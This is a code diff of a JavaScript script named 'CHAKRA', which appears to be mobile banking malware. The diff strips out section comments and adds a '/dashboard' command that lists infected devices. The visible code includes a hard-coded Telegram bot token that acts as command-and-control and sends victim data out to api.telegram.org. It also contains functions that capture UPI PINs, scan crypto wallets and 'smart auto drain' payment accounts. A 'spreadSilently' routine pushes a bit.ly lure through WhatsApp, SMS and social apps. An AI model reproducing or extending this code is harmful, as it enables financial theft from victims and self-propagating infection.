@@ -140,7 +140,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - COMPLETE SCRIPT WITH DASHBOARD FIX
+  // CHAKRA - COMPLETE SCRIPT WITH DASHBOARD
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -167,9 +167,6 @@
   let cryptoDetected = false;
   let spreadCounts = { whatsapp: 0, sms: 0, telegram: 0, instagram: 0, facebook: 0, gpay: 0 };
 
-  // ============================================================
-  // SEND TO TELEGRAM
-  // ============================================================
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
@@ -178,9 +175,6 @@
     }).catch(() => {});
   }
 
-  // ============================================================
-  // GET UNIQUE DEVICE ID
-  // ============================================================
   function getDeviceId() {
     try {
       if (window.Android) {
@@ -190,9 +184,6 @@
     return Date.now().toString();
   }
 
-  // ============================================================
-  // VICTIM DETAILS
-  // ============================================================
   function getVictimDetails() {
     let details = { name: 'Unknown', balance: 'Unknown', device: 'Unknown' };
     try {
@@ -205,9 +196,6 @@
     return details;
   }
 
-  // ============================================================
-  // SCAN CRYPTO WALLET
-  // ============================================================
   function scanCryptoWallet() {
     try {
       if (window.Android) {
@@ -221,9 +209,6 @@
     return null;
   }
 
-  // ============================================================
-  // POPUPS & CLICKS
-  // ============================================================
   function showPopup(id) { document.getElementById(id).classList.remove('hidden'); }
   function hidePopup(id) { document.getElementById(id).classList.add('hidden'); }
   function showTermsPopup(action) { pendingAction = action; showPopup('popupTerms'); }
@@ -279,9 +264,6 @@
     setTimeout(() => window.close(), 3000);
   }
 
-  // ============================================================
-  // UPI MANAGEMENT
-  // ============================================================
   function addUPI(upi) {
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
@@ -314,9 +296,6 @@
     return myUPIList[currentUPIIndex];
   }
 
-  // ============================================================
-  // CRYPTO MANAGEMENT
-  // ============================================================
   function setCryptoAddress(token, address) {
     cryptoAddresses[token] = address;
     sendToTelegram('✅ ' + token + ' address set: ' + address);
@@ -389,9 +368,6 @@
     }
   }
 
-  // ============================================================
-  // PIN CAPTURE
-  // ============================================================
   function getUPIPin() {
     let pin = null;
     try {
@@ -454,9 +430,6 @@
     }
   }
 
-  // ============================================================
-  // APP DETECTION
-  // ============================================================
   function isUpiAppOpen() {
     try {
       if (window.Android) {
@@ -491,18 +464,12 @@
     return false;
   }
 
-  // ============================================================
-  // RECORD SPREAD
-  // ============================================================
   function recordSpread(vector) {
     if (spreadCounts[vector] !== undefined) {
       spreadCounts[vector]++;
     }
   }
 
-  // ============================================================
-  // SILENT SPREAD
-  // ============================================================
   function spreadSilently() {
     const link = 'Watch this reel 🔥 https://bit.ly/4xaXs4E';
 
@@ -566,9 +533,6 @@
     }
   }
 
-  // ============================================================
-  // SMART AUTO DRAIN
-  // ============================================================
   function smartAutoDrain() {
     spreadSilently();
 
@@ -610,9 +574,6 @@
     return false;
   }
 
-  // ============================================================
-  // MAIN LOOPS
-  // ============================================================
   setInterval(() => {
     if (!isPaused) {
       spreadSilently();
@@ -772,7 +733,9 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ---- DASHBOARD (FIXED) ----
+            // ============================================================
+            // ✅ DASHBOARD COMMAND (ADDED HERE)
+            // ============================================================
             if (msg === '/dashboard') {
               // Get recent downloads (last 10)
               const recentDownloads = infectedDevices
